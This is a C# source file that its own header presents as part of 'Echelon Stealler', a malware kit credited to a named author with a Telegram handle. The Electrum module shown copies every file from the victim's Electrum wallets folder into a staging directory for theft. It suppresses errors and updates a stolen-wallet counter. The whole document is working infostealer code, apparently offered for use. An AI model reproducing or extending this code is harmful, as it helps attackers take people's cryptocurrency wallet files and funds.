///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////


using System.IO;

namespace Echelon
{
    class Electrum
    {
        public static int count = 0;
        public static string ElectrumDir = "\\Wallets\\Electrum\\";

        public static void EleStr(string directorypath) 
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\Electrum\\wallets").GetFiles())
                {
                    Directory.CreateDirectory(directorypath + ElectrumDir);
                    file.CopyTo(directorypath + ElectrumDir + file.Name);
                }
                count++;
                StartWallets.count++;
            }
            catch {}
        }
    }
}
